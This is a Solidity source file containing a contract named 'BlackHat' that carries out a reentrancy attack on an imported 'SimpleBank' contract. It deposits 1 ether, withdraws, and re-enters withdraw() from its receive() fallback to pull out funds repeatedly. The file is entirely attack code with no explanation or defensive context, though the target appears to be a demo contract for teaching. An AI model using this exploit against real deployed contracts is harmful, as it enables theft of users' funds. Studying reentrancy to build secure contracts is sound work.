//SPDX-License-Identifier: MIT 

pragma solidity ^0.8.20;

import {SimpleBank} from "./SimpleBank.sol";


contract BlackHat {
  mapping(address => uint) public balances;
  SimpleBank simpleBank;

  constructor (address _simplebankAddress) {
    simpleBank = SimpleBank(_simplebankAddress);
  }

  receive() external payable {
    if (address(this).balance >= 1 ether) {
      simpleBank.withdraw();
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    simpleBank.deposit{value: 1 ether}();
    simpleBank.withdraw();
  }

  function getBalances() public view returns (uint) {
    return address(this).balance;
  }
}